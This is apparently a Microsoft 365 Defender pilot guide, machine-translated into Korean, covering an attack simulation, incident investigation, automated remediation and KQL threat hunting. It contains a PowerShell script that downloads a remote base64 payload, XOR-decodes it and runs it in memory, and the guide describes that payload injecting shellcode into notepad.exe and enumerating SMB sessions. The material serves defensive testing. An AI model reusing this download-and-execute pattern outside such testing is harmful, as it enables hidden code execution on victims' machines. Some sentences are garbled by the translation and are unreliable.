---
title: Defender Microsoft 365 시뮬레이션 실행
description: Defender 파일럿 Microsoft 365 대한 공격 시뮬레이션을 실행하여 공격 시뮬레이션을 실행하여 공격이 어떻게 진행되고 신속하게 수정하는지 볼 수 있습니다.
keywords: Microsoft 365 Defender 파일럿 공격 시뮬레이션, Microsoft 365 Defender 파일럿 공격 시뮬레이션을 실행하고, Microsoft 365 Defender의 공격을 시뮬레이션하고, Microsoft 365 Defender 파일럿 프로젝트, 사이버 보안, 고급 영구 위협, 엔터프라이즈 보안, 장치, 장치, ID, 사용자, 데이터, 응용 프로그램, 인시던트, 자동화된 조사 및 수정, 고급 헌팅
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dolmont
author: DulceMontemayor
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365solution-scenario
- m365solution-pilotmtpproject
ms.topic: conceptual
ms.technology: m365d
ms.openlocfilehash: 767a7ea4c4c7604d1d4b227f08e4ca32c62737c5
ms.sourcegitcommit: a8d8cee7df535a150985d6165afdfddfdf21f622
ms.translationtype: MT
ms.contentlocale: ko-KR
ms.lasthandoff: 04/21/2021
ms.locfileid: "51934480"
---
# <a name="run-your-microsoft-365-defender-attack-simulations"></a>Defender Microsoft 365 시뮬레이션 실행

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]


|[![계획](../../media/phase-diagrams/1-planning.png)](m365d-pilot-plan.md)<br/>[계획](m365d-pilot-plan.md)|[![준비](../../media/phase-diagrams/2-prepare.png)](prepare-m365d-eval.md)<br/>[준비](prepare-m365d-eval.md)|![공격 시뮬레이션](../../media/phase-diagrams/3-simluate.png)<br/>공격 시뮬레이션|[![닫기 및 요약](../../media/phase-diagrams/4-summary.png)](m365d-pilot-close.md)<br/>[닫기 및 요약](m365d-pilot-close.md)|
|--|--|--|--|
|||*여기 있습니다!*||

현재 공격 시뮬레이션 단계에 있습니다.

파일럿 환경을 준비한 후 이제 파일럿 Microsoft 365 자동화된 조사 및 수정 기능을 테스트해야 합니다. 고급 기술을 활용하여 감지에서 숨기는 정교한 공격을 시뮬레이트하는 데 도움을 줄 것입니다. 이 공격은 도메인 컨트롤러에서 연 SMB(서버 메시지 블록) 세션을 열고 사용자의 장치의 최근 IP 주소를 검색합니다. 일반적으로 이 공격 범주에는 피해자의 장치에 삭제된 파일이 포함되어 있는 것이 아니라 메모리에서만 발생합니다. 기존 시스템 및 관리 도구를 사용하여 "육지에서 라이브"한 후 실행을 숨기기 위해 시스템 프로세스에 코드를 삽입합니다. 이러한 동작을 사용하면 검색을 피하고 디바이스에서 유지될 수 있습니다.

이 시뮬레이션에서는 샘플 시나리오가 PowerShell 스크립트로 시작됩니다. 사용자가 스크립트를 실행하도록 속일 수 있습니다. 또는 스크립트가 이전에 감염된 장치에서 다른 컴퓨터로의 원격 연결(공격자가 네트워크에서 을(를) 이동하려고 시도할 수 있습니다. 관리자가 스크립트를 원격으로 실행하여 다양한 관리 작업을 수행하기도 하여 이러한 스크립트를 검색하기 어려울 수 있습니다.

![프로세스 주입 및 SMB 정비 공격 다이어그램을 사용하여 파일 없는 PowerShell 공격](../../media/mtp/mtpdiydiagram.png)

시뮬레이션하는 동안 공격은 셸코드를 무고한 프로세스에 주입합니다. 이 시나리오에서는 이 시나리오를 사용하려면 notepad.exe. 시뮬레이션을 위해 이 프로세스를 선택했지만 공격자는 추가와 같은 장기 실행 시스템 프로세스를 대상으로 할 svchost.exe. 그런 다음 셸 코드는 공격자 명령 및 제어(C2) 서버에 연결하여 진행 방법에 대한 지침을 수신합니다. 스크립트는 DC(도메인 컨트롤러)에 대해 정비 쿼리 실행을 시도합니다. 정비를 통해 공격자는 최근 사용자 로그인 정보에 대한 정보를 얻을 수 있습니다. 공격자가 이 정보를 가지면 네트워크에서 을(를) 이동하여 특정 중요한 계정으로 이동할 수 있습니다.

> [!IMPORTANT]
> 최적의 결과를 얻기 위해 가능한 한 공격 시뮬레이션 지침을 따르세요.

## <a name="simulation-environment-requirements"></a>시뮬레이션 환경 요구 사항

준비 단계에서 파일럿 환경을 이미 구성한 것이기 때문에 이 시나리오에 대해 테스트 장치와 도메인 컨트롤러의 두 장치가 있는지 확인합니다.

1. 테넌트에서 [Defender를 사용하도록 Microsoft 365 확인합니다.](m365d-enable.md#confirm-that-the-service-is-on)

2. 테스트 도메인 컨트롤러 구성 확인:

   - 디바이스는 Windows Server 2008 R2 이상 버전에서 실행됩니다.
   - ID에 대한 [Microsoft Defender에 대한](/azure/security-center/security-center-wdatp) 테스트 도메인 컨트롤러를 사용하여 원격 [관리를 사용하도록 설정합니다.](/windows-server/administration/server-manager/configure-remote-management-in-server-manager)
   - Microsoft [Defender for Identity](/cloud-app-security/mdi-integration) 및 Microsoft Cloud App Security 통합이 활성화되어 있는지 확인합니다.
   - 테스트 사용자가 도메인에 만들어지며 관리자 권한이 필요하지 않습니다.

3. 테스트 장치 구성 확인:

   1. 디바이스는 Windows 10 버전 이상 버전으로 실행됩니다.

   1. 테스트 장치가 테스트 도메인에 연결됩니다.

   1. [를 Windows Defender 바이러스 백신.](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features) 사용자 설정에 문제가 Windows Defender 바이러스 백신 문제 해결 항목을 [참조하세요.](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy)

   1. 테스트 장치가 [끝점용 Microsoft Defender에 온보딩된지 확인합니다.](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints)

기존 테넌트를 사용하여 장치 그룹을 구현하는 경우 테스트 장치에 대한 전용 장치 그룹을 만들고 구성 UX에서 최상위 수준으로 푸시합니다.

## <a name="run-the-attack-scenario-simulation"></a>공격 시나리오 시뮬레이션 실행

공격 시나리오 시뮬레이션을 실행합니다.

1. 테스트 사용자 계정을 사용하여 테스트 장치에 로그인합니다.

2. 테스트 Windows PowerShell 창을 여십시오.

3. 다음 시뮬레이션 스크립트를 복사합니다.

   ```powershell
   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
   = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
   -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
   $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
   $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
   ```

   > [!NOTE]
   > 웹 브라우저에서 이 문서를 열면 특정 문자를 잃거나 추가 줄 변경 없이 전체 텍스트를 복사하는 데 문제가 발생할 수 있습니다. 이 문서를 다운로드하여 Adobe Reader에서 여는 경우

4. 프롬프트에서 복사한 스크립트를 붙여넣고 실행합니다.

> [!NOTE]
> RDP(원격 데스크톱 프로토콜)를 사용하여 PowerShell을 실행하는 경우 **CTRL-V** 바로 가기 키 또는 마우스 오른쪽 단추 클릭 붙여넣기 메서드가 작동하지 않을 수 있기 때문에 RDP 클라이언트에서 클립보드 텍스트 형식 명령을 사용합니다. 최신 버전의 PowerShell도 이 메서드를 허용하지 않는 경우, 메모리에서 메모장 먼저 복사하여 가상 머신에 복사한 다음 PowerShell에 붙여넣아야 할 수 있습니다.

몇 초 후에 <i>notepad.exe</i> 열립니다. 시뮬레이트된 공격 코드는 해당 코드에 notepad.exe. 전체 시나리오를 메모장 자동으로 생성된 메모장 인스턴스를 열어 두면 됩니다.

시뮬레이트된 공격 코드는 외부 IP 주소(C2 서버 시뮬레이트)와 통신한 다음 SMB를 통해 도메인 컨트롤러에 대한 정경을 시도합니다.

이 스크립트가 완료되면 PowerShell 콘솔에 메시지가 표시됩니다.

```console
ran NetSessionEnum against [DC Name] with return code result 0
```

자동화된 인시던트 및 대응 기능이 실제로 실행되고 notepad.exe 열어 봐야 합니다. 자동화된 인시던트 및 대응 프로세스가 메모장 있습니다.

## <a name="investigate-an-incident"></a>인시던트 조사

> [!NOTE]
> 이 시뮬레이션을 진행하기 전에 다음 비디오를 시청하여 인시던트 관리가 관련 경고를 조사 프로세스의 일부로 모을 수 있는 방법, 포털에서 찾을 수 있는 위치 및 보안 작업에 도움이 되는 방법을 참조합니다.

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bzwz?]

SOC 분석가의 시선으로 전환하면 이제 보안 센터 포털에서 공격 조사를 시작할 Microsoft 365 있습니다.

1. 모든 [Microsoft 365 보안](https://security.microsoft.com/incidents) 센터 포털 인시던트 큐를 열 수 있습니다.

2. 메뉴에서 **인시던트로** 이동합니다.

    ![보안 센터의 왼쪽 메뉴에 Microsoft 365 인시던트 스크린샷](../../media/mtp/fig1.png)

3. 시뮬레이트된 공격에 대한 새 인시던트가 인시던트 큐에 표시됩니다.

    ![문제 큐 스크린샷](../../media/mtp/fig2.png)

### <a name="investigate-the-attack-as-a-single-incident"></a>단일 인시던트로 공격 조사

Microsoft 365 Defender는 분석을 상관 관계화하고 서로 다른 제품의 모든 관련 경고 및 조사를 하나의 인시던트 엔터티로 집계합니다. 이렇게 하면 Microsoft 365 공격 범위가 넓어지며 SOC 분석가가 복잡한 위협을 이해하고 대응할 수 있습니다.

이 시뮬레이션 중에 생성된 경고는 동일한 위협과 연결되며 그 결과로 자동으로 단일 인시던트로 집계됩니다.

인시던트 보기:

1. **인시던트 큐로** 이동합니다.

   ![탐색 메뉴의 인시던트 스크린샷](../../media/mtp/fig1.png)

2. 사고 이름 왼쪽에 있는 원을 클릭하여 새 항목을 선택합니다. 사이드 패널에는 모든 관련 경고를 포함하여 인시던트에 대한 추가 정보가 표시됩니다. 각 인시던트에는 포함된 경고의 특성에 따라 해당 이름을 설명하는 고유한 이름이 있습니다.

   ![시뮬레이션 중에 생성된 경고가 집계되는 인시던트 페이지의 스크린샷](../../media/mtp/fig4.png)

   대시보드에 표시하는 경고는 ID용 Microsoft Defender, Microsoft Cloud App Security, 끝점용 Microsoft Defender, Microsoft 365 Defender 및 Microsoft Defender for Office 365.

3. **인시던트에 대한** 자세한 정보를 확인하려면 문제 페이지 열기 를 선택합니다.

   **인시던트 페이지에서** 인시던트와 관련된 모든 경고 및 정보를 볼 수 있습니다. 이 정보에는 경고와 관련된 엔터티 및 자산, 경고의 검색 원본(ID에 대한 Microsoft Defender, EDR), 이러한 엔터티와 자산이 함께 연결된 이유가 포함됩니다. 인시던트 경고 목록을 검토하면 공격의 진행률이 표시됩니다. 이 보기에서 개별 경고를 보고 조사할 수 있습니다.

   오른쪽 메뉴에서  인시던트 관리를 클릭하여 인시던트에 태그를 지정하고, 인시던트에 할당하고, 설명을 추가할 수도 있습니다.

   ![인시던트 관리를 클릭할 위치 스크린샷](../../media/mtp/fig5a.png)

   ![인시던트에 태그를 지정하고, 인시던트에 할당하고, 설명을 추가할 수 있는 문제 관리 패널의 필드 스크린샷 ](../../media/mtp/fig5b.png)

### <a name="review-generated-alerts"></a>생성된 경고 검토

시뮬레이트된 공격 중에 생성되는 몇 가지 경고를 살펴보아 봐야 합니다.

> [!NOTE]
> 시뮬레이트된 공격 중에 생성된 몇 가지 경고만 진행합니다. 테스트 장치에서 실행되는 Windows 및 Microsoft 365 Defender 제품 버전에 따라 약간 다른 순서로 더 많은 경고가 표시될 수 있습니다.

![생성된 경고 스크린샷](../../media/mtp/fig6.png)

#### <a name="alert-suspicious-process-injection-observed-source-microsoft-defender-for-endpoint-edr"></a>경고: 관찰된 의심스러운 프로세스 삽입(원본: 끝점용 Microsoft Defender EDR)

고급 공격자는 정교한 도용 방법을 사용하여 메모리를 유지하고 검색 도구에서 숨길 수 있습니다. 한 가지 일반적인 기술은 악의적인 실행이 아닌 신뢰할 수 있는 시스템 프로세스 내에서 작동하여 검색 도구 및 보안 운영에서 악성 코드를 발견하기 어렵게 만드는 것입니다.

SOC 분석가가 이러한 고급 공격을 감지할 수 있도록 끝점용 Microsoft Defender의 심층 메모리 센서는 다양한 프로세스 간 코드 삽입 기술에 대한 전례 없는 가시성을 클라우드 서비스를 제공합니다. 다음 그림에서는 Endpoint용 Defender가 에 코드를 삽입하려고 시도를 감지하고 경고하는 <i>방법을notepad.exe. </i>

![잠재적으로 악성 코드 삽입에 대한 경고 스크린샷](../../media/mtp/fig7.png)

#### <a name="alert-unexpected-behavior-observed-by-a-process-run-with-no-command-line-arguments-source-microsoft-defender-for-endpoint-edr"></a>경고: 명령줄 인수를 실행하지 않은 프로세스에서 관찰된 예기치 않은 동작(원본: 끝점용 Microsoft Defender EDR)

끝점 검색을 위한 Microsoft Defender는 종종 공격 기술의 가장 일반적인 특성을 대상으로 합니다. 이 방법을 사용하면 지속성이 보장되고 공격자가 최신 전략으로 전환할 수 있습니다.

당사는 대규모 학습 알고리즘을 사용하여 조직 및 전 세계에 있는 일반적인 프로세스의 정상적인 동작을 설정하고 이러한 프로세스가 정상적인 동작을 표시하는 경우를 감시합니다. 이러한 특이한 동작은 종종 신뢰할 수 있는 프로세스에서 불일치 코드가 도입되고 실행되고 있는 것을 나타냅니다.

이 시나리오에서 프로세스 <i></i>notepad.exe외부 위치와의 통신과 관련된 비정상적인 동작이 표시됩니다. 이 결과는 악성 코드를 도입하고 실행하는 데 사용되는 특정 방법과는 독립적입니다.

> [!NOTE]
> 이 경고는 추가 백엔드 처리가 필요한 기계 학습 모델을 기반으로 하기 때문에 포털에 이 경고가 표시되기까지 다소 시간이 걸릴 수 있습니다.

경고 세부 정보에는 조사를 확장하기 위해 피벗으로 사용할 수 있는 표시기인 외부 IP 주소가 포함되어 있습니다.

IP 주소 세부 정보 페이지를 확인하려면 경고 프로세스 트리에서 IP 주소를 선택합니다.

![명령줄 인수를 포함하지 않은 프로세스 실행으로 예기치 않은 동작에 대한 경고 스크린샷](../../media/mtp/fig8.png)

다음 그림에는 선택한 IP 주소 세부 정보 페이지(경고 프로세스 트리에서 IP 주소 클릭)가 표시됩니다.
![IP 주소 세부 정보 페이지의 스크린샷](../../media/mtp/fig9.png)

#### <a name="alert-user-and-ip-address-reconnaissance-smb-source-microsoft-defender-for-identity"></a>경고: SMB(사용자 및 IP 주소 정)(원본: ID용 Microsoft Defender)

SMB(서버 메시지 블록) 프로토콜을 사용하여 열문을 사용하면 공격자가 최근 사용자 로그온 정보를 얻을 수 있습니다. 이 정보를 통해 공격자는 네트워크를 통해 먼 으로 이동하여 특정 중요한 계정에 액세스하는 데 도움이 됩니다.

이 검색에서는 도메인 컨트롤러에 대해 SMB 세션 열호가 실행될 때 경고가 트리거됩니다.

![사용자 및 IP 주소 정 분석에 대한 ID에 대한 Microsoft Defender 경고 스크린샷](../../media/mtp/fig10.png)

### <a name="review-the-device-timeline-microsoft-defender-for-endpoint"></a>장치 타임라인 검토[끝점용 Microsoft Defender]

이 인시던트에서 다양한 경고를 탐색한 후 앞에서 조사한 문제 페이지로 다시 이동합니다. **인시던트** 페이지에서 장치 탭을 선택하여 끝점용 Microsoft Defender 및 ID용 Microsoft Defender에서 보고한 이 인시던트와 관련된 장치를 검토합니다.

공격이 수행된 디바이스의 이름을 선택하여 해당 특정 장치에 대한 엔터티 페이지를 열 수 있습니다. 해당 페이지에서 트리거된 경고 및 관련 이벤트를 볼 수 있습니다.

시간 표시 **막대 탭을** 선택하여 디바이스 타임라인을 열고 장치에서 관찰된 모든 이벤트 및 동작을 시간 순서대로 보고 경고가 발생했습니다.

![동작이 있는 장치 타임라인 스크린샷](../../media/mtp/fig11.png)

좀 더 흥미로운 동작 중 일부를 확장하면 프로세스 트리와 같은 유용한 세부 정보가 있습니다.

예를 들어 경고 이벤트 의심스러운 프로세스 주입이 발견될 때까지 아래로 **스크롤합니다.** 왼쪽 **창의** powershell.exe 그래프 아래에 이 동작에 대한 전체 프로세스 트리를 표시하려면 notepad.exe  프로세스 이벤트에 삽입된 옵션을 선택합니다. 필요한 경우 필터링에 검색 표시줄을 사용하세요.

![선택한 PowerShell 파일 만들기 동작에 대한 프로세스 트리 스크린샷](../../media/mtp/fig12.png)

### <a name="review-the-user-information-microsoft-cloud-app-security"></a>사용자 정보 검토 [Microsoft Cloud App Security]

인시던트 페이지에서  사용자 탭을 선택하여 공격에 관련된 사용자 목록을 표시합니다. 이 표에는 각 사용자의 조사 우선 순위 점수를 포함하여 각 사용자에 대한 추가 **정보가 포함되어** 있습니다.

사용자 이름을 선택하여 추가 조사를 실시할 수 있는 사용자의 프로필 페이지를 열 수 있습니다. [위험한 사용자 조사에 대해 자세히 읽어 를 읽어 읽습니다.](/cloud-app-security/tutorial-ueba#identify)

![사용자 Cloud App Security 스크린샷](../../media/mtp/fig13.png)

## <a name="automated-investigation-and-remediation"></a>자동화된 조사 및 수정

> [!NOTE]
>이 시뮬레이션을 진행하기 전에 다음 비디오를 시청하여 자동화된 자동 복구가 무엇일지, 포털에서 찾을 수 있는 위치 및 보안 작업에 도움이 되는지 익숙해지기 전에 다음 비디오를 시청해 봐야 합니다.

> [!VIDEO https://www.microsoft.com/en-us/videoplayer/embed/RE4BzwB]

보안 센터 포털에서 인시던트로 Microsoft 365 이동합니다. **인시던트** 페이지의  조사 탭에는 ID에 대한 Microsoft Defender 및 끝점용 Microsoft Defender에서 트리거한 자동화된 조사가 표시됩니다. 아래 스크린샷에는 Endpoint용 Defender에서 트리거한 자동화된 조사만 표시됩니다. 기본적으로 Endpoint용 Defender는 큐에서 발견된 아티팩트를 자동으로 수정하여 수정해야 합니다.

![인시던트와 관련된 자동화된 조사 스크린샷](../../media/mtp/fig14.png)

조사를 트리거한 경고를 선택하여 조사 세부 정보 **페이지를 열** 수 있습니다. 다음과 같은 세부 정보를 볼 수 있습니다.

- 자동화된 조사를 트리거한 경고입니다.
- 영향을 미치는 사용자 및 장치. 추가 장치에서 표시기가 발견되는 경우 이러한 추가 장치도 나열됩니다.
- 증거 목록입니다. 파일, 프로세스, 서비스, 드라이버 및 네트워크 주소와 같은 엔터티를 찾아 분석합니다. 이러한 엔터티는 경고와의 가능한 관계에 대해 분석하고 양성 또는 악의적인 것으로 등급이 지정됩니다.
- 위협이 발견됩니다. 조사 중에 발견된 알려진 위협입니다.

> [!NOTE]
> 시기에 따라 자동화된 조사가 계속 실행되고 있을 수 있습니다. 증거를 수집 및 분석하고 결과를 검토하기 전에 프로세스가 완료될 때까지 몇 분 정도 기다립니다. 조사 **세부 정보 페이지를 새로** 고쳐 최신 결과를 얻습니다.

![조사 세부 정보 페이지의 스크린샷](../../media/mtp/fig15.png)

자동화된 조사 중에 끝점용 Microsoft Defender는 수정이 notepad.exe 아티팩트 중 하나로 주입된 프로세스가 확인되었습니다. Endpoint용 Defender는 자동화된 수정의 일부로 의심스러운 프로세스 삽입을 자동으로 중지합니다.

테스트 장치에서 <i>notepad.exe</i> 프로세스 목록에서 사라지는 과정을 볼 수 있습니다.

## <a name="resolve-the-incident"></a>인시던트 해결

조사가 완료된 후 수정이 확인되면 인시던트 닫습니다.

**인시던트 관리를 선택합니다.** 상태를 문제 **해결로** 설정하고 관련 분류를 선택합니다.

인시던트가 해결되면 보안 센터 및 관련 포털에서 Microsoft 365 모든 관련 알림을 닫습니다.

![문제 해결을 위해 스위치를 클릭할 수 있는 열린 문제 관리 패널이 있는 문제 페이지의 스크린샷](../../media/mtp/fig16.png)

그러면 인시던트 관리 및 자동화된 조사 및 수정 시나리오에 대한 공격 시뮬레이션이 마무리됩니다. 다음 시뮬레이션을 통해 잠재적인 악성 파일에 대한 사전 위협 헌팅을 진행할 수 있습니다.

## <a name="advanced-hunting-scenario"></a>고급 헌팅 시나리오

> [!NOTE]
> 시뮬레이션을 진행하기 전에 다음 비디오를 시청하여 고급 헌팅 개념을 이해하고 포털에서 찾을 수 있는 위치를 확인하며 보안 작업에 도움이 되는 방법을 파악합니다.

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bp7O]

### <a name="hunting-environment-requirements"></a>헌팅 환경 요구 사항

이 시나리오에는 단일 내부 사서함 및 장치가 필요합니다. 테스트 메시지를 보내기 위해 외부 전자 메일 계정도 필요합니다.

1. 테넌트가 [Defender 에서 Microsoft 365 확인합니다.](m365d-enable.md#confirm-that-the-service-is-on)
2. 전자 메일을 받는 데 사용할 대상 사서함을 식별합니다.
    a. 이 사서함은 Microsoft Defender에서 b에 대해 Office 365 합니다. 요구 사항 3의 장치가 이 사서함에 액세스해야 합니다.
3. 테스트 장치 구성: a. 버전 1903 이상을 Windows 10 있는지 확인
    b. 테스트 장치를 테스트 도메인에 가입합니다.
    c. [를 Windows Defender 바이러스 백신.](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features) 사용자 설정에 문제가 Windows Defender 바이러스 백신 문제 해결 항목을 [참조하세요.](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy)
    d. [끝점용 Microsoft Defender에 온보딩합니다.](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints)

### <a name="run-the-simulation"></a>시뮬레이션 실행

1. 외부 전자 메일 계정에서 테스트 환경 요구 사항 섹션의 2단계에서 식별된 사서함으로 전자 메일을 전송합니다. 기존 전자 메일 필터 정책을 통해 허용되는 첨부 파일을 포함합니다. 이 파일은 악성 파일이나 실행 파일이 아니어도 됩니다. 제안되는 파일 <i>형식은 </i>.pdf<i>,</i>.exe(허용되는 경우) 또는 Word Office 문서와 같은 파일 형식입니다.
2. 테스트 환경 요구 사항 섹션의 3단계에 정의된 것으로 구성된 장치에서 보낸 전자 메일을 열 수 있습니다. 첨부 파일을 열거나 장치에 파일을 저장합니다.

#### <a name="go-hunting"></a>헌팅으로 이동

1. 포털을 security.microsoft.com 을 열 수 있습니다.

2. 고급 **헌팅 > 헌팅으로 이동합니다.**

   ![M365 보안 센터 포털 탐색 모음의 고급 헌팅 스크린샷](../../media/mtp/fig17.png)

3. 전자 메일 이벤트를 수집하여 시작하는 쿼리를 작성합니다.

   1. 쿼리 창에서 새로 고치기 를 선택합니다.

   1. Schema에서 EmailEvents 테이블을 두 번 클릭합니다.

      ```console
      EmailEvents
      ```

   1. 시간 프레임을 지난 24시간으로 변경합니다. 위의 시뮬레이션을 실행할 때 보낸 전자 메일이 지난 24시간 동안의 경우 그렇지 않으면 시간 프레임을 변경합니다.

      ![시간 프레임을 변경할 수 있는 위치의 스크린샷. 드롭다운 메뉴를 열어 시간 프레임 옵션 범위에서 선택합니다.](../../media/mtp/fig18.png)

   1. 쿼리를 실행합니다. 파일럿 환경에 따라 결과가 다를 수 있습니다.

      > [!NOTE]
      > 데이터 반환을 제한하는 필터링 옵션에 대한 다음 단계를 참조하세요.

      ![고급 헌팅 쿼리 결과 스크린샷](../../media/mtp/fig19.png)

        > [!NOTE]
        > 고급 헌팅은 쿼리 결과를 테이블형 데이터로 표시됩니다. 차트와 같은 다른 형식의 데이터를 볼 수도 있습니다.

   1. 결과를 확인하고 연 전자 메일을 식별할 수 있는지 봐야 합니다. 고급 헌팅에 메시지가 표시될 때 최대 2시간이 걸릴 수 있습니다. 전자 메일 환경이 크고 결과가 많은 경우 필터 표시  옵션을 사용하여 메시지를 찾을 수 있습니다.

      샘플에서 전자 메일은 Yahoo 계정에서 전송됩니다. **+** SenderFromDomain **yahoo.com** 옆에 있는 아이콘을 클릭한 다음  적용을 클릭하여 선택한 도메인을 쿼리에 추가합니다. 시뮬레이션 실행의 1단계에서 테스트 메시지를 보내는 데 사용된 도메인 또는 전자 메일 계정을 사용하여 결과를 필터링합니다. 쿼리를 다시 실행하여 더 작은 결과 집합을 확인하여 시뮬레이션에서 메시지가 표시되어 있는지를 확인할 수 있습니다.

      ![필터 스크린샷. 필터를 사용하여 검색 범위를 좁히고 원하는 정보를 빠르게 찾을 수 있습니다.](../../media/mtp/fig20.png)

      ```console
      EmailEvents
      | where SenderMailFromDomain == "yahoo.com"
      ```

   1. 레코드를 검사할 수 있도록 쿼리에서 결과 행을 클릭합니다.

      ![고급 헌팅 결과가 선택될 때 열 수 있는 조사 레코드 사이드 패널의 스크린샷](../../media/mtp/fig21.png)

4. 이제 전자 메일을 볼 수 있는 것으로 확인되면 첨부 파일에 대한 필터를 추가합니다. 환경의 첨부 파일이 있는 모든 전자 메일에 집중합니다. 이 시나리오에서는 사용자 환경에서 전송되는 전자 메일이 아니라 인바운드 전자 메일에 중점을 니다. 메시지를 찾기 위해 추가한 필터를 제거하고 "| 여기서 **AttachmentCount > 및** **EmailDirection**  ==  **"Inbound""**

   다음 쿼리는 모든 전자 메일 이벤트에 대한 초기 쿼리보다 짧은 목록으로 결과를 보여 주게 됩니다.

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   ```

5. 그런 다음 결과 집합에 첨부 파일에 대한 정보(예: 파일 이름, 해시)를 포함합니다. 이렇게 하여 **EmailAttachmentInfo** 테이블을 조인합니다. 조인에 사용할 일반 필드는 **NetworkMessageId** 및 **RecipientObjectId입니다.**

   다음 쿼리에는 "| **project-rename EmailTimestamp=Timestamp**" - 다음 단계에서 추가할 파일 작업과 관련된 타임스탬프와 전자 메일과 관련된 타임스탬프를 식별하는 데 도움이 됩니다.

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   | project-rename EmailTimestamp=Timestamp
   | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
   ```

6. 그런 다음 **EmailAttachmentInfo** 테이블의 **SHA256** 값을 사용하여 해당 해시에 대한 **DeviceFileEvents(끝점에서** 수행된 파일 작업)를 확인합니다. 여기서 공통 필드는 첨부 파일에 대한 SHA256 해시입니다.

   결과 테이블에는 이제 끝점(끝점용 Microsoft Defender)의 세부 정보(예: 장치 이름, 수행된 작업(이 경우 FileCreated 이벤트만 포함) 및 파일이 저장된 위치가 포함됩니다. 프로세스와 연결된 계정 이름도 포함됩니다.

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   | project-rename EmailTimestamp=Timestamp
   | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
   | join DeviceFileEvents on SHA256
   | where ActionType == "FileCreated"
   ```

   이제 사용자가 첨부 파일을 열거나 저장한 모든 인바운드 전자 메일을 식별하는 쿼리를 만들 수 있습니다. 이 쿼리를 구체화하여 특정 보낸 사람 도메인, 파일 크기, 파일 형식 등도 필터링할 수 있습니다.

7. 함수는 특수한 종류의 조인으로, 파일에 대한 추가 TI 데이터(예: 보급, 서명자 및 발급자 정보 등)를 끌어와야 합니다. 파일에 대한 자세한 내용을 확인하기 위해 **FileProfile()** 함수 향상을 사용 합니다.

    ```console
    EmailEvents
    | where AttachmentCount > 0 and EmailDirection == "Inbound"
    | project-rename EmailTimestamp=Timestamp
    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
    | join DeviceFileEvents on SHA256
    | where ActionType == "FileCreated"
    | distinct SHA1
    | invoke FileProfile()
    ```

#### <a name="create-a-detection"></a>검색 만들기

향후 경고를 받을 정보를 식별하는 쿼리를 만든  후 쿼리에서 사용자 지정 검색을 만들 수 있습니다.

사용자 지정 검색은 설정한 빈도에 따라 쿼리를 실행하고 쿼리 결과에 따라 선택한 영향을 미치는 자산에 따라 보안 경고가 생성됩니다. 이러한 경고는 인시던트와 상호 관련이 있으며 제품 중 하나에서 생성된 다른 보안 경고로 조사될 수 있습니다.

1. 쿼리 페이지에서 이동 헌팅 지침의 7단계에서 추가된 줄 7과 8을 제거하고 검색 규칙 **만들기를 클릭합니다.**

   ![고급 헌팅 페이지에서 검색 규칙 만들기를 클릭할 수 있는 위치 스크린샷](../../media/mtp/fig22.png)

   > [!NOTE]
   > 검색 규칙 **만들기를** 클릭하고 쿼리에 구문 오류가 있는 경우 검색 규칙이 저장되지 않습니다. 쿼리를 다시 확인하여 오류가 없는지 검사합니다.

2. 보안 팀에서 경고를 이해할 수 있는 정보, 경고가 생성된 이유 및 수행할 것으로 예상되는 작업을 파악하는 데 필요한 필드를 입력합니다.

   ![경고 세부 정보를 정의할 수 있는 검색 규칙 만들기 페이지의 스크린샷](../../media/mtp/fig23.png)

   이 검색 규칙 경고에 대한 정보를 통해 다음 사용자에게 정보를 제공하도록 필드를 명확히 작성해야 합니다.

3. 이 경고에 영향을 미치는 엔터티를 선택합니다. 이 경우 장치 및 **사서함 을** **선택합니다.**

   ![영향을 미치는 엔터티의 매개 변수를 선택할 수 있는 검색 규칙 만들기 페이지의 스크린샷](../../media/mtp/fig24.png)

4. 경고가 트리거되는 경우 수행할 작업을 결정 합니다. 이 경우 다른 작업을 수행할 수 있는 경우에도 바이러스 백신 검색을 실행합니다.

   ![위협을 해결하기 위해 경고가 트리거될 때 바이러스 백신 검색을 실행할 수 있는 검색 규칙 만들기 페이지의 스크린샷](../../media/mtp/fig25.png)

5. 경고 규칙의 범위를 선택합니다. 이 쿼리는 장치를 포함하기 때문에 장치 그룹은 끝점 컨텍스트에 대한 Microsoft Defender에 따라 이 사용자 지정 검색과 관련이 있습니다. 영향을 미치는 엔터티로 장치를 포함하지 않는 사용자 지정 검색을 만드는 경우 범위가 적용되지 않습니다.

   ![경고 규칙의 범위를 설정할 수 있는 검색 규칙 만들기 페이지의 스크린샷은 결과에 대한 기대치를 관리합니다.](../../media/mtp/fig26.png)

   이 파일럿에서는 이 규칙을 프로덕션 환경의 테스트 장치 하위 집합으로 제한할 수 있습니다.

